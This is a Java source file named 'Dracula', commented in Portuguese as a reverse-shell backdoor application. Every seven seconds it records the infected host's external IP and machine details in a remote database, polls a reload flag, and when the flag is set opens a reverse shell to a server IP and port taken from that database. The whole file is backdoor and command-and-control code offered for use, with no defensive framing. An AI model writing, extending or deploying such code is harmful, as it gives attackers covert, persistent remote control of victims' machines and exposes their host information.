/*
 * Dracula
 * É um aplicativo para shell reverse em linguagem Java
 * Permite a execução da backboor por tempo de definição
 */
package dracula;

import DB.DBO;
import exploit.ShellReverse;
import host.Hosts;
import java.util.Timer;
import java.util.TimerTask;
import static task.Task.TEMPO;

/**
 *
 * @author legend
 */
public class Dracula {
  
    public static final long TEMPO = (1000 * 7); // atualiza o site a cada 7 segundos 
    
    public static void main(String[] args) {   
        
        System.out.println("Inicio..");
        Timer timer = null;
        
        if (timer == null) 
        {            
            timer = new Timer();
            TimerTask tarefa = new TimerTask() 
            {                
                public void Mythread(){
             
                    new Thread() {

                        @Override
                        public void run() {
                         
                            DBO db = new DBO();
                            db.openConnection();
                            int status = db.getServerReload();
                            db.closeConncection();
                            Connect(status);
                            
                        }
                      
                    }.start();

                }
                
                public void Connect(int status)
                {
                    if(status == 1)
                    {
                        DBO db = new DBO();
                        db.openConnection();
                        db.setSql("UPDATE reload SET status=0",2);
                        ShellReverse shellreverse = new ShellReverse(db.getServerIP(),db.getServerPort());
                        shellreverse.executeShellReverse();                       
                        db.closeConncection();
                    }
                }
                
                public Boolean Host()
                {
                    DBO db = new DBO();
                    db.openConnection();
                    Hosts host = new Hosts();
                    db.getExistHost(host.getIpExternal());
                    db.getExistMachine(db.LastId("hosts"));
                    boolean ret = db.insertHosts(host);
                    db.insertMachine(host);
                    db.insertReload(db.LastId("hosts"));
                    db.closeConncection();
                    return ret;
                }
                
                public void run() {
                    try 
                    {                        
                        if(Host())
                            System.out.println("New Host Insert..");
                        System.out.println("-- Task reload --");                        
                        Mythread();

                    } catch (Exception e) { e.printStackTrace(); }
                }
            };
            timer.scheduleAtFixedRate(tarefa, TEMPO, TEMPO);
        }      
        
    } 
    
}
